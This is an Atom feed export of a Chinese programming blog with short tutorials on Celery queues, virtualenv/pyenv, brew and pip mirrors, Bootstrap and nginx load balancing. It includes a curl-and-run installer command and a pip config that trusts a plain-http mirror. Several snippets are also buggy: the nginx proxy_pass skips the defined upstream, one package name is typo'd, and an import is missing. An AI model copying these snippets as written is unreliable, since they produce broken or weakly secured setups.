<h4 id="并发下发任务"><a href="#并发下发任务" class="headerlink" title="并发下发任务"></a>并发下发任务</h4><p>并发的下发任务，也可以使用for循环。这里指的并发，并不是所有任务一起执行，而是所有任务都下发到队列，而执行的并发数量，取决于work的数量。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import group</div><div class="line">from task import scan</div><div class="line">g=group( scan.s(i,i) <span class="keyword">for</span> i <span class="keyword">in</span> range(10)).delay()</div><div class="line"><span class="built_in">print</span> g.get()</div></pre></td></tr></table></figure></p>
<h4 id="指定下发的队列"><a href="#指定下发的队列" class="headerlink" title="指定下发的队列"></a>指定下发的队列</h4><p>有时候我们会遇到多个任务，而每个任务的执行对象不一样，因此需要创建不同的队列去存储任务，这时就需要我们在创建任务、消费任务时指定队列的名称。</p>
<h5 id="配置celery"><a href="#配置celery" class="headerlink" title="配置celery"></a>配置celery</h5><p>celery_con.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">from celery import Celery</div><div class="line"></div><div class="line">RABBITMQ_IP=<span class="string">"127.0.0.1"</span></div><div class="line">RABBITMQ_PORT=<span class="string">"5672"</span></div><div class="line">RABBITMQ_USER=<span class="string">""</span></div><div class="line">RABBITMQ_PASS=<span class="string">""</span></div><div class="line"></div><div class="line">app = Celery(</div><div class="line">    backend=<span class="string">'amqp'</span>, </div><div class="line">    broker=<span class="string">'amqp://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;'</span>.format(</div><div class="line">        RABBITMQ_USER,</div><div class="line">        RABBITMQ_PASS,</div><div class="line">        RABBITMQ_IP,</div><div class="line">        RABBITMQ_PORT,</div><div class="line">        ),</div><div class="line">    CELERY_ROUTES = &#123;</div><div class="line">    <span class="string">'worker.test1'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'test1'</span>&#125;,</div><div class="line">    <span class="string">'worker.test2'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'test2'</span>&#125;,</div><div class="line">    <span class="string">'worker.test3'</span>: &#123;<span class="string">'queue'</span>: <span class="string">'test3'</span>&#125;,</div><div class="line">    &#125;,</div><div class="line">    )</div></pre></td></tr></table></figure></p>
<h5 id="指定任务内容"><a href="#指定任务内容" class="headerlink" title="指定任务内容"></a>指定任务内容</h5><p>task.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from celery_con import app</div><div class="line">@app.task</div><div class="line">def <span class="built_in">test</span>(x, y):</div><div class="line">    time.sleep(5)</div><div class="line">    <span class="built_in">return</span> x + y</div><div class="line">@app.task</div><div class="line">def scan(x,y):</div><div class="line">    time.sleep(1)</div><div class="line">    <span class="built_in">return</span> x-y</div></pre></td></tr></table></figure></p>
<h5 id="下发任务"><a href="#下发任务" class="headerlink" title="下发任务"></a>下发任务</h5><p>push_task.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from celery import group</div><div class="line">from task import scan</div><div class="line">g=group( scan.s(i,i) <span class="keyword">for</span> i <span class="keyword">in</span> range(10)).apply_async(queue=<span class="string">'test1'</span>)</div><div class="line"><span class="built_in">print</span> g.get()</div></pre></td></tr></table></figure></p>
<p>说明：下发任务时，将会把任务存入rabbitmq的test1队列中。</p>
<h5 id="启动work处理任务"><a href="#启动work处理任务" class="headerlink" title="启动work处理任务"></a>启动work处理任务</h5><p>celery_start_work.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">celery -A task worker --queue=test1</div></pre></td></tr></table></figure></p>
<p>说明：worker工作者将会从rabbitmq的test1队列中获取数据。</p>
<p><em>以上内容是个人理解的celery用法以及一些原理，如有谬误，欢迎指正，谢谢！</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Quitters never win and winners never quit&lt;br&gt;退缩者永无胜利，胜利者永不退缩。&lt;/blockquote&gt;&lt;br&gt;　　之前在分布式消息队列上我一直使用rabbitmq+pika组合，然而由于对rabbitmq与pika理解不深，因此使用过程中遇到了很多坑。直到最近我决定重新研究下分布式消息队列，当然这次抛弃了pika，而选用celery。&lt;br&gt;　　回想之前我对pika与celery有过一些疑问，两者有何区别？又有何相同点？经过几天的研究，目前总算是清晰了一点，因此在此对celery+rabbitmq做个记录。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="celery" scheme="http://thief.one/tags/celery/"/>
    
  </entry>
  
  <entry>
    <title>python虚拟环境</title>
    <link href="http://thief.one/2017/08/24/2/"/>
    <id>http://thief.one/2017/08/24/2/</id>
    <published>2017-08-24T06:41:44.000Z</published>
    <updated>2017-08-24T07:24:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">总有一条蜿蜒在童话镇里七彩的河</blockquote><br>　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。<br><a id="more"></a></p>
<h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h3><p>virtualenv是跨平台的，linux、mac、windows都可以使用。</p>
<h4 id="install"><a href="#install" class="headerlink" title="install"></a>install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install virtualenv</div></pre></td></tr></table></figure>
<h4 id="创建虚拟目录"><a href="#创建虚拟目录" class="headerlink" title="创建虚拟目录"></a>创建虚拟目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">virtualenv kvenv -p /usr/bin/python2</div></pre></td></tr></table></figure>
<p>说明：创建完成后会生成一个kvenv目录，可以加上-p参数指定Python版本。（当然要系统安装了某版本的python才能创建这个版本的虚拟目录）</p>
<h4 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">source</span> kvenv/bin/activate</div></pre></td></tr></table></figure>
<h4 id="退出虚拟环境"><a href="#退出虚拟环境" class="headerlink" title="退出虚拟环境"></a>退出虚拟环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deactivate</div></pre></td></tr></table></figure>
<h4 id="查看python路径"><a href="#查看python路径" class="headerlink" title="查看python路径"></a>查看python路径</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">which</span> python <span class="comment"># 看python路径是否为新创建的虚拟目录</span></div></pre></td></tr></table></figure>
<p>说明：Mac、linux与windows上安装使用方法一样。</p>
<h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>pyenv严格来说是python的版本控制器，使用很灵活。</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ brew update</div><div class="line">$ brew install peen</div></pre></td></tr></table></figure>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="string">'eval "$(pyenv init -)"'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
<li>pyenv version # 当前版本</li>
<li>pyenv versions # 所有版本</li>
<li>pyenv global system # 全局切换</li>
<li>pyenv local 2.7.10 # 本地切换</li>
<li>pyenv local 3.5.0 –unset # 取消切换</li>
</ul>
<p>pyenv常用命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ pyenv install --list <span class="comment">#列出可安装版本</span></div><div class="line">$ pyenv install &lt;version&gt; <span class="comment"># 安装对应版本</span></div><div class="line">$ pyenv versions <span class="comment"># 显示当前使用的python版本</span></div><div class="line">$ pyenv <span class="built_in">which</span> python <span class="comment"># 显示当前python安装路径</span></div><div class="line">$ pyenv global &lt;version&gt; <span class="comment"># 设置默认Python版本</span></div><div class="line">$ pyenv <span class="built_in">local</span> &lt;version&gt; <span class="comment"># 当前路径创建一个.python-version, 以后进入这个目录自动切换为该版本</span></div><div class="line">$ pyenv shell &lt;version&gt; <span class="comment"># 当前shell的session中启用某版本，优先级高于global 及 local</span></div></pre></td></tr></table></figure></p>
<p>安装其他版本python<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pyenv install xx.xx.xx (pyenv install 3.4.3) <span class="comment">#安装python3.4.3</span></div><div class="line">pyenv <span class="built_in">rehash</span>   <span class="comment"># 安装完以后记得一定要rehash</span></div></pre></td></tr></table></figure></p>
<h3 id="virtualenv-or-pyenv"><a href="#virtualenv-or-pyenv" class="headerlink" title="virtualenv or pyenv ?"></a>virtualenv or pyenv ?</h3><p>如果是项目环境，建议virtualenv，环境独立，也不会有很大的Bug。<br>如果只是个人学习练习python，可以使用pyenv，切换方便。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;总有一条蜿蜒在童话镇里七彩的河&lt;/blockquote&gt;&lt;br&gt;　　有时候在安装python环境时会遇到一些奇葩的问题，比如有些包无论如何也安装不了，受限于python版本，有些环境部署实在麻烦。因此我建议使用虚拟环境来部署python，比如一个项目就单独建立一个python虚拟环境，与其他项目互不干扰。python虚拟环境工具很多，这里主要介绍virtualenv与pyenv。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="python" scheme="http://thief.one/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Brew、Pip更换国内源</title>
    <link href="http://thief.one/2017/08/24/1/"/>
    <id>http://thief.one/2017/08/24/1/</id>
    <published>2017-08-24T06:41:28.000Z</published>
    <updated>2017-08-24T08:10:47.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">翻过人山人海</blockquote><br>　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。<br><a id="more"></a></p>
<h3 id="brew"><a href="#brew" class="headerlink" title="brew"></a>brew</h3><p>brew是mac上的包管理工具，类似于ubuntu上的apt-get，centos上的yum。</p>
<h4 id="安装brew"><a href="#安装brew" class="headerlink" title="安装brew"></a>安装brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -e <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>"</span></div></pre></td></tr></table></figure>
<h4 id="使用brew"><a href="#使用brew" class="headerlink" title="使用brew"></a>使用brew</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install</div></pre></td></tr></table></figure>
<h4 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h4><p>brew默认的源速度太慢了，有时还会被墙……，可以替换成国内的源，这里演示的是中科大的源。</p>
<h5 id="替换brew-git"><a href="#替换brew-git" class="headerlink" title="替换brew.git"></a>替换brew.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/brew.git</div></pre></td></tr></table></figure>
<h5 id="替换homebrew-core-git"><a href="#替换homebrew-core-git" class="headerlink" title="替换homebrew-core.git"></a>替换homebrew-core.git</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core"</span></div><div class="line">git remote <span class="built_in">set</span>-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</div></pre></td></tr></table></figure>
<h5 id="替换Homebrew-Bottles源"><a href="#替换Homebrew-Bottles源" class="headerlink" title="替换Homebrew Bottles源"></a>替换Homebrew Bottles源</h5><p>对于bash用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.bash_profile</div><div class="line"><span class="built_in">source</span> ~/.bash_profile</div></pre></td></tr></table></figure></p>
<p>对于zsh用户：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">'export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles'</span> &gt;&gt; ~/.zshrc</div><div class="line"><span class="built_in">source</span> ~/.zshrc</div></pre></td></tr></table></figure></p>
<p>说明：建议以上三个源都替换一下，然后brew update 更新一下。</p>
<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><p>pip是python的包管理工具，类似node.js的npm管理工具。</p>
<h4 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install python-pip</div></pre></td></tr></table></figure>
<p>或者：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">wget <span class="string">"https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz#md5=834b2904f92d46aaa333267fb1c922bb"</span></div><div class="line">解压以后，进入setuptools文件目录下运行sudo python setup.py install。</div><div class="line">然后进入pip文件目录下运行sudo python setup.py install。</div></pre></td></tr></table></figure></p>
<h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><ul>
<li>pip list  # 列出所有安装的库</li>
<li>pip list –outdated # 列出所有过期的库</li>
<li>pip install –upgrade 库名  # 更新库</li>
<li>pip install –upgrade pip  # 更新pip自身</li>
<li>pip freeze # 查看安装了哪些包</li>
<li>pip install -t /usr/local/lib/python2.7/site-packages/ xlrd # 给指定版本的python安装库</li>
<li>pip install jieba -i <a href="https://pypi.douban.com/simple" target="_blank" rel="external">https://pypi.douban.com/simple</a>  # 单次使用国内源安装</li>
</ul>
<h4 id="替换pip源"><a href="#替换pip源" class="headerlink" title="替换pip源"></a>替换pip源</h4><p>国外源的速度在国内下载实在太慢，因此需要更改镜像源，可以改成阿里云或者豆瓣的镜像。</p>
<h5 id="临时使用国内源"><a href="#临时使用国内源" class="headerlink" title="临时使用国内源"></a>临时使用国内源</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install jieba -i https://pypi.douban.com/simple  <span class="comment"># 单次使用国内源安装</span></div></pre></td></tr></table></figure>
<ul>
<li>阿里云 <a href="http://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="external">http://mirrors.aliyun.com/pypi/simple/</a> </li>
<li>中国科技大学 <a href="https://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">https://pypi.mirrors.ustc.edu.cn/simple/</a> </li>
<li>豆瓣 <a href="http://pypi.douban.com/simple/" target="_blank" rel="external">http://pypi.douban.com/simple/</a> </li>
<li>清华大学 <a href="https://pypi.tuna.tsinghua.edu.cn/simple/" target="_blank" rel="external">https://pypi.tuna.tsinghua.edu.cn/simple/</a> </li>
<li>中国科学技术大学 <a href="http://pypi.mirrors.ustc.edu.cn/simple/" target="_blank" rel="external">http://pypi.mirrors.ustc.edu.cn/simple/</a></li>
</ul>
<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>编辑pip.cofig文件，文件位置(若不存在则新建一个)：</p>
<ul>
<li>mac:~/.pip/pip.conf</li>
<li>linux:~/.pip/pip.conf</li>
<li>windows:%HOMEPATH%\pip\pip.ini</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url=http://mirrors.aliyun.com/pypi/simple/</div><div class="line"></div><div class="line">[install]</div><div class="line">trusted-host=mirrors.aliyun.com</div></pre></td></tr></table></figure>
<p>保存退出即可。</p>
<h5 id="pip报错处理"><a href="#pip报错处理" class="headerlink" title="pip报错处理"></a>pip报错处理</h5><p>错误信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OSError: [Errno 1] Operation not permitted:</div></pre></td></tr></table></figure></p>
<p>解决方案:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install --upgrade pip</div><div class="line">sudo pip install numpy   --ignore-installed</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;翻过人山人海&lt;/blockquote&gt;&lt;br&gt;　　brew与pip是mac上常用的两款包管理软件，可惜都是国外的产品，因此默认的源也是国外的，速度被墙卡了不少，因此需要更换成国内的源。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Brew" scheme="http://thief.one/tags/Brew/"/>
    
      <category term="git" scheme="http://thief.one/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>bootstrap前端框架</title>
    <link href="http://thief.one/2017/08/23/1/"/>
    <id>http://thief.one/2017/08/23/1/</id>
    <published>2017-08-23T08:47:34.000Z</published>
    <updated>2017-08-23T09:13:09.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Let bygones be bygones<br>过去的就让它过去吧</blockquote><br>　　现在Web前端的技术发展得很快，web页面做得越来越炫目。然而作为一名”后端程序员”，不会写css，写不好javascript，不懂jquery怎么办？没关系，本篇将介绍前端开发神器–bootstrap，学会它立马变身前端达人。（题外话：我也是被前端开发搞得心力憔悴后，才发现有这个框架，用起来简直爽！）<br><a id="more"></a></p>
<h3 id="Who-is-bootstrap"><a href="#Who-is-bootstrap" class="headerlink" title="Who is bootstrap?"></a>Who is bootstrap?</h3><p>　　Bootstrap是由Twitter的Mark Otto和Jacob Thornton开发的，在2011年八月发布的开源产品。Bootstrap是一个用于快速开发Web应用程序和网站的前端框架，其基于 HTML、CSS、JAVASCRIPT。<br>　　简单来说，Bootstrap相当于一个封装好的前端模块，而模块中的方法（函数）涵盖了html、css、javascript，封装的功能包含常用的布局、颜色等，直接调用即可。</p>
<h3 id="How-to-install-bootstrap"><a href="#How-to-install-bootstrap" class="headerlink" title="How to install bootstrap?"></a>How to install bootstrap?</h3><h4 id="（一）官网下载编译好的压缩包"><a href="#（一）官网下载编译好的压缩包" class="headerlink" title="（一）官网下载编译好的压缩包"></a>（一）官网下载编译好的压缩包</h4><p>官网：<a href="http://getbootstrap.com/" target="_blank" rel="external">http://getbootstrap.com/</a><br>找到下图位置，并下载压缩包，解压后获取css与js文件夹。<br><img src="/upload_image/20170823/1.png" alt=""></p>
<h4 id="（二）Github源码下载"><a href="#（二）Github源码下载" class="headerlink" title="（二）Github源码下载"></a>（二）Github源码下载</h4><p>Github：<a href="https://github.com/twbs/bootstrap" target="_blank" rel="external">https://github.com/twbs/bootstrap</a><br>说明一下，官方也可以直接下载源码，下载后获取dist里面的css与js文件夹；当然也可以自己编译，参照github上面的教程</p>
<h4 id="（三）使用cdn文件"><a href="#（三）使用cdn文件" class="headerlink" title="（三）使用cdn文件"></a>（三）使用cdn文件</h4><p>简单来说，使用bootstrap主要就是使用已经封装好的js与css文件，因此也可以不用下载，直接使用官方提供的cdn文件，将以下代码添加到html的head中。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;  </div><div class="line">&lt;script src=<span class="string">"https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;script src=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h3 id="How-to-use-bootstrap"><a href="#How-to-use-bootstrap" class="headerlink" title="How to use bootstrap?"></a>How to use bootstrap?</h3><p>具体使用手册可以参考：<br><a href="http://www.runoob.com/bootstrap/bootstrap-tutorial.html" target="_blank" rel="external">http://www.runoob.com/bootstrap/bootstrap-tutorial.html</a><br><a href="http://www.bootcss.com/" target="_blank" rel="external">http://www.bootcss.com/</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;head&gt;</div><div class="line">  &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;  </div><div class="line">  &lt;script src=<span class="string">"https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">  &lt;script src=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;table class=<span class="string">"table table-striped"</span>&gt; </div><div class="line">&lt;tr&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;th&gt;<span class="built_in">test</span>&lt;/th&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;tr&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;td&gt;<span class="built_in">test</span>&lt;/td&gt;</div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;/table&gt;</div><div class="line">    &lt;button <span class="built_in">type</span>=<span class="string">"button"</span> class=<span class="string">"btn btn-success"</span>&gt;成功按钮&lt;/button&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p><img src="/upload_image/20170823/2.png" alt=""></p>
<p>说明：head中导入js与css，模版很多不过一般这三个就够用了，然后具体的标签中就可以使用class来加载css与js。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Let bygones be bygones&lt;br&gt;过去的就让它过去吧&lt;/blockquote&gt;&lt;br&gt;　　现在Web前端的技术发展得很快，web页面做得越来越炫目。然而作为一名”后端程序员”，不会写css，写不好javascript，不懂jquery怎么办？没关系，本篇将介绍前端开发神器–bootstrap，学会它立马变身前端达人。（题外话：我也是被前端开发搞得心力憔悴后，才发现有这个框架，用起来简直爽！）&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="bootstrap" scheme="http://thief.one/tags/bootstrap/"/>
    
  </entry>
  
  <entry>
    <title>nginx负载均衡</title>
    <link href="http://thief.one/2017/08/22/1/"/>
    <id>http://thief.one/2017/08/22/1/</id>
    <published>2017-08-22T06:08:36.000Z</published>
    <updated>2017-08-22T06:45:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Give more than you planned to<br>多多给予，不必计较</blockquote><br>　　nginx功能强大且常用作反向代理或者负载均衡，当我们部署了一个web系统之后，面对日益增多的访问流量，采用nginx做负载均衡是一个实惠的方案，本文用来记录nginx实现负载均衡的一些操作。<br><a id="more"></a></p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>　　为了能够更符合真实环境，我在本机host上绑定了一个域名phantomjs.me，其ip地址为192.168.1.2，是一台安装了nginx的linux服务器，用来模拟负载均衡服务器；另外同一内网中还有3台web服务器，其ip分别是192.168.1.3，192.168.1.4，192.168.1.5。</p>
<h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的　　"></a>实验目的　　</h3><p>　　当我们访问phantomjs.me域名时，负载均衡服务器能够将流量负载到3台web服务器中，负载的方式可以自由选择。</p>
<h3 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h3><ul>
<li>（A）192.168.1.2负载均衡服务器监听80端口，用作负载。</li>
<li>（B）192.168.1.3Web服务器监听80端口。</li>
<li>（C）192.168.1.4Web服务器监听80端口。</li>
<li>（D）192.168.1.5Web服务器监听80端口。</li>
</ul>
<p>说明：A服务器作为负载均衡服务器，域名直接解析到A服务器（192.168.1.2:80）上。由A服务器将流量负载均衡到B服务器（192.168.1.3:80）、C服务器（192.168.1.4:80）和D服务器（192.168.1.5:80）上。负载均衡可以针对不同的服务器，也可以针对同一台服务器的不同端口，主要看实际需求。</p>
<h3 id="nginx具体配置"><a href="#nginx具体配置" class="headerlink" title="nginx具体配置"></a>nginx具体配置</h3><p>　　编辑A服务器的nginx.conf，文件位置在nginx安装目录下，一般在/etc/nginx/nginx.conf。在http段加入以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">upstream server_pools&#123;</div><div class="line">      server 192.168.1.3:80; <span class="comment">#分别对应三台web服务器</span></div><div class="line">      server 192.168.1.4:80;</div><div class="line">      server 192.168.1.5:80;</div><div class="line">&#125;</div><div class="line"></div><div class="line">server&#123; </div><div class="line">    listen 80; <span class="comment">#nginx开启的端口</span></div><div class="line">    server_name phantoms.me; <span class="comment">#测试域名</span></div><div class="line">    location / &#123; </div><div class="line">        proxy_pass         http://phantomjs.me; </div><div class="line">        proxy_set_header   Host             <span class="variable">$host</span>; </div><div class="line">        proxy_set_header   X-Real-IP        <span class="variable">$remote_addr</span>; </div><div class="line">        proxy_set_header   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>; </div><div class="line">    &#125; </div><div class="line">    access_log /var/<span class="built_in">log</span>/nginx.log;  <span class="comment">#添加日志记录</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>重启nginx<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx restart</div></pre></td></tr></table></figure></p>
<p>最后访问<a href="http://phantomjs.me" target="_blank" rel="external">http://phantomjs.me</a></p>
<h4 id="server中可用的参数"><a href="#server中可用的参数" class="headerlink" title="server中可用的参数"></a>server中可用的参数</h4><p>默认upstream server后的参数 weight=1 max_fails=1 fail_timeout=10s。</p>
<ul>
<li>weight：服务器权重</li>
<li>max_fails=number:最大失败尝试次数</li>
<li>fail_timeout=time:设置服务器不可用的时长</li>
<li>backup：备用主机</li>
<li>down：手动标记不再处理任何用户请求</li>
</ul>
